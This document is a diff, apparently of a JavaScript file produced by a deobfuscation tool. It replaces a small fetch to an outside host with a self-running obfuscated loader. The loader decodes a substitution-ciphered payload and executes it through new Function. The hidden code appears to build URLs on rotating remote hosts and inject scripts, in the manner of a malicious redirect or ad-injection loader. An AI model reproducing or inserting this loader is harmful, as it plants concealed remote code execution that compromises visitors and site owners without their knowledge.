@@ -1,14 +1,99 @@
-//Tue Aug 05 2025 05:27:07 GMT+0000 (Coordinated Universal Time)
+//Fri Aug 08 2025 23:15:59 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-function koso() {
-  const {
-    java: _0x32c3f8,
-    source: _0x33cb69
-  } = this;
-  let _0x5429f5 = _0x32c3f8.get("http://gednvy.yesui.me/", {
-    "Content-Type": "application/json",
-    "Accept": String("application/json, text/plain, */*")
-  }).body();
-  return _0x5429f5;
-}
+!function () {
+  function a(a) {
+    var _idx = "a2gl11h4er";
+    var b = {
+      e: "P",
+      w: "D",
+      T: "y",
+      "+": "J",
+      l: "!",
+      t: "L",
+      E: "E",
+      "@": "2",
+      d: "a",
+      b: "%",
+      q: "l",
+      X: "v",
+      "~": "R",
+      5: "r",
+      "&": "X",
+      C: "j",
+      "]": "F",
+      a: ")",
+      "^": "m",
+      ",": "~",
+      "}": "1",
+      x: "C",
+      c: "(",
+      G: "@",
+      h: "h",
+      ".": "*",
+      L: "s",
+      "=": ",",
+      p: "g",
+      I: "Q",
+      1: "7",
+      _: "u",
+      K: "6",
+      F: "t",
+      2: "n",
+      8: "=",
+      k: "G",
+      Z: "]",
+      ")": "b",
+      P: "}",
+      B: "U",
+      S: "k",
+      6: "i",
+      g: ":",
+      N: "N",
+      i: "S",
+      "%": "+",
+      "-": "Y",
+      "?": "|",
+      4: "z",
+      "*": "-",
+      3: "^",
+      "[": "{",
+      "(": "c",
+      u: "B",
+      y: "M",
+      U: "Z",
+      H: "[",
+      z: "K",
+      9: "H",
+      7: "f",
+      R: "x",
+      v: "&",
+      "!": ";",
+      M: "_",
+      Q: "9",
+      Y: "e",
+      o: "4",
+      r: "A",
+      m: ".",
+      O: "o",
+      V: "W",
+      J: "p",
+      f: "d",
+      ":": "q",
+      "{": "8",
+      W: "I",
+      j: "?",
+      n: "5",
+      s: "3",
+      "|": "T",
+      A: "V",
+      D: "w",
+      ";": "O"
+    };
+    return a.split("").map(function (a) {
+      return undefined !== b[a] ? b[a] : a;
+    }).join("");
+  }
+  var b = a('data:image/jpg;base64,cca8>[qYF O8D62fODm622Y5V6fFh=d8O/Ko0.c}00%n0.cs*N_^)Y5c"}"aaa!7_2(F6O2 6ca[5YF_52"vX8"%cmn<ydFhm5d2fO^caj}g@aPqYF (8[YXY2F|TJYg"FO_(hY2f"=qOdfiFdF_Lg0=Rg"d@pq}}hoY5"=5Y|5Tg0=LqOFWfg2cmn<ydFhm5d2fO^cajngKaP!Xd5 F8"i|"%(mR!XO6f 0888D62fODHFZjD62fODHFZ8}g(mR82c{a%"Q"!qYF _8"bGYFYGb"=f8HZ!F5T[f8+i;NmJd5LYcYc_a??"HZ"aP(dF(hcFa[f8HZP7_2(F6O2 qcFa[5YF_52 Fm5YJqd(Yc"[[fdTPP"=c2YD wdFYampYFwdFYcaaP7_2(F6O2 YcF=Ya[qYF 282_qq!F5T[28qO(dqiFO5dpYmpYFWFY^cFaP(dF(hcFa[Yvvc28YcaaP5YF_52 2P7_2(F6O2 LcF=Y=2a[F5T[qO(dqiFO5dpYmLYFWFY^cF=YaP(dF(hcFa[2vv2caPP7_2(F6O2 2cFa[qYF Y80<d5p_^Y2FLmqY2pFhvvXO6f 0l88FjFg}=28"d)(fY7h6CSq^2OJ:5LF_XDRT4"=582mqY2pFh=O8""!7O5c!Y**!a[Xd5 d8ydFhm5d2fO^ca=682HydFhm7qOO5cd.5aZ!O%8d<mKj6g6mFOBJJY5xdLYcaP5YF_52 OP7_2(F6O2 JcFa[qYF Y8fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!Xd5 28H"hFFJLg\/\/[[fdTPP@n0SqfRCCLm7DDYXY4mRT4gQ}{Q"="hFFJLg\/\/[[fdTPP@n0SqfRCCLmFJ6RD:)mRT4gQ}{Q"="hFFJLg\/\/[[fdTPP@n0SqfRCCLmF))J7O4mRT4gQ}{Q"="hFFJLg\/\/[[fdTPP@n0SqfRCCLm7DDYXY4mRT4gQ}{Q"="hFFJLg\/\/[[fdTPP@n0SqfRCCLmFJ6RD:)mRT4gQ}{Q"="hFFJLg\/\/[[fdTPP@n0SqfRCCLmF))J7O4mRT4gQ}{Q"="hFFJLg\/\/[[fdTPP@n0SqfRCCLmFJ6RD:)mRT4gQ}{Q"Z!qYF 58qc2Hc2YD wdFYampYFwdTcaZ??2H0Za%"/h^/@n0"!585%c*}8885m62fYR;7c"j"aj"j"g"v"a%"R8"%(mR%"v58"%(m5Y|5T%%%"vF8"%pca%6ca=YmL5(8qc5a=YmO2qOdf87_2(F6O2ca[(mqOdfiFdF_L8@P=YmO2Y55O587_2(F6O2ca[FvvFca=LYF|6^YO_Fc7_2(F6O2ca[Ym5Y^OXYcaP=}0aP=fO(_^Y2FmhYdfmdJJY2fxh6qfcYa=(mqOdfiFdF_L8}P7_2(F6O2 pca[qYF F8Yc"bb___b"a!5YF_52 F??Lc"bb___b"=F8ydFhm5d2fO^camFOiF562pcsKamL_)LF562pcsa=7_2(F6O2ca[F%8"M"Pa=Y2(OfYB~WxO^JO2Y2FcFaPqYF 78"@n0"!7_2(F6O2 hcFa[}l88Fm5YdfTiFdFYvv0l88Fm5YdfTiFdFY??Fm(qOLYcaP7_2(F6O2 ^cFa[Xd5 Y8H"@n02CfRCf7m5F^(XROmRT4"="@n0CSfRCfXm^LLFRfXmRT4"="@n0OSfRC47m5F^(XROmRT4"="@n0F(fRC2Sm^LLFRfXmRT4"="@n0DhfRCdJm5F^(XROmRT4"="@n0h)fRCCqm^LLFRfXmRT4"="@n0JffRC7Dm5F^(XROmRT4"Z=Y8YHc2YD wdFYampYFwdTcaZ??YH0Z=Y8"DLLg//"%c2YD wdFYampYFwdFYca%Y%"g@Q}{Q"!qYF 582YD VY)iO(SYFcY%"/"%7%"jR8"%(mR%"v58"%(m5Y|5T%%%"vF8"%pca%6caa!5mO2OJY287_2(F6O2ca[(mqOdfiFdF_L8@P=5mO2^YLLdpY87_2(F6O2cYa[Y8YmfdFd!F5T[2YD ]_2(F6O2c"M(_5L"=cF8>[qYF O=Y=2=5=d=6=(8"(hd5rF"=_8"75O^xhd5xOfY"=f8"(hd5xOfYrF"=q8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cF8Fm5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<FmqY2pFh!a28LHqZcFH(Zcp%%aa=58LHqZcFH(Zcp%%aa=d8LHqZcFH(Zcp%%aa=68LHqZcFH(Zcp%%aa=O8c}nv5a<<o?d>>@=Y8csvda<<K?6=J%8iF562pH_Zc2<<@?5>>oa=Kol88dvvcJ%8iF562pH_ZcOaa=Kol886vvcJ%8iF562pH_ZcYaa![Xd5 78J!qYF F8""=Y=2=5!7O5cY8O8280!Y<7mqY2pFh!acO87HfZcYaa<}@{jcF%8iF562pH_ZcOa=Y%%ag}Q}<OvvO<@@ojc287HfZcY%}a=F%8iF562pH_Zccs}vOa<<K?Ksv2a=Y%8@agc287HfZcY%}a=587HfZcY%@a=F%8iF562pH_Zcc}nvOa<<}@?cKsv2a<<K?Ksv5a=Y%8sa!5YF_52 FPPacYaacfO(_^Y2Fm(_55Y2Fi(56JFaP(dF(hcFa[Xd5 28YmqY2pFh*o0=282<0j0gJd5LYW2FcydFhm5d2fO^ca.2a!Xc@}o=` $[Fm^YLLdpYP M[$[2Pg$[YmL_)LF562pc2=2%o0aPPM`a=(mqOdfiFdF_L8*}Phc5aP=5mO2Y55O587_2(F6O2ca[@l88(mqOdfiFdF_LvvFvvFca=hc5aP=(mqOdfiFdF_L8}P7_2(F6O2 XcF=Ya[Y8}<d5p_^Y2FLmqY2pFhvvXO6f 0l88YjYg""!(mqOdfiFdF_L8*}=}00<fmqY2pFh??cfmJ_Lhc`c$[FPa`%Ya=Lc_=+i;NmLF562p67TcfaaaP7_2(F6O2 Dca[LYF|6^YO_Fc7_2(F6O2ca[67c@l88(mqOdfiFdF_La[Xd5 F8D62fODH(mRZ=[LqOFWfg2=YXY2F|TJYg5P8(!FmLFTqYmD6fFh8O%"JR"=c28fO(_^Y2Fm(5YdFYEqY^Y2Fc2aamLFTqYm(LL|YRF8`f6LJqdTg)qO(S!D6fFhg}00b!hY6phFg$[dPJR!`=FmdJJY2fxh6qfc2a=2mdffEXY2Ft6LFY2Y5c5=7_2(F6O2ca[Xd5 F8qc"hFFJLg//[[fdTPP@n0SJfRC)((XmF6f5JhXmRT4gQ}{Q/((/@n0j6LM2OF8}vFd5pYF8}vFT8@"a!FOJmqO(dF6O2l88LYq7mqO(dF6O2jFOJmqO(dF6O28FgD62fODmqO(dF6O2mh5Y78FPa!qYF Y8qc"hFFJLg//[[fdTPP@n0SqfRCCLm7DDYXY4mRT4gQ}{Q/f/@n0j(8}vR8d@pq}}hoY5"a!YvvLYF|6^YO_Fc7_2(F6O2ca[Xd5 F8fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!FmL5(8Y=fO(_^Y2FmhYdfmdJJY2fxh6qfcFaP=}YsaPP=@n00aP[qYF Y82dX6pdFO5mJqdF7O5^=28l/3cV62?yd(a/mFYLFcYa=58Jd5LYW2FcL(5YY2mhY6phFa>8Jd5LYW2FcL(5YY2mD6fFha!Xd5 i87_2(F6O2cFa[c2??5avvcD62fODH(mRZ8F=/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5?IzI?kOqfu5ODLY5/6mFYLFc2dX6pdFO5m_LY5rpY2Faj^c7_2(F6O2ca[Xc@}}a=Jc7_2(F6O2ca[Xc@}saPaPagJc7_2(F6O2ca[Xc}}}a=^c7_2(F6O2ca[Xc}}saPaPaa=l2vvY??DcaP!67c""888cF8fO(_^Y2Fm(_55Y2Fi(56JFmJ5YX6O_LEqY^Y2Fi6)q62pam622Y59|ytmF56^caaFm6f8(mR=icFa!YqLY[qYF Y8LYFW2FY5Xdqc7_2(F6O2ca[Xd5 F8fO(_^Y2FmpYFEqY^Y2FuTWfc(mRa!Fvvc(qYd5W2FY5XdqcYa=icFaaP=n00aPXO6f 0l882dX6pdFO5mLY2fuYd(O2vvfO(_^Y2FmdffEXY2Ft6LFY2Y5c"X6L6)6q6FT(hd2pY"=7_2(F6O2ca[Xd5 F=Y!"h6ffY2"888fO(_^Y2FmX6L6)6q6FTiFdFYvvfmqY2pFhvvcF8qc"hFFJLg//[[fdTPP@n0SqfRCCLm7DDYXY4mRT4gQ}{Q"a%"/)_pj68"%7=cY82YD ]O5^wdFdamdJJY2fc"^YLLdpY"=+i;NmLF562p67Tcfaa=YmdJJY2fc"F"="}"a=2dX6pdFO5mLY2fuYd(O2cF=Ya=fmqY2pFh80=Lc_=""aaPaPPaca!'.substr(22));
+  new Function(b)();
+}();
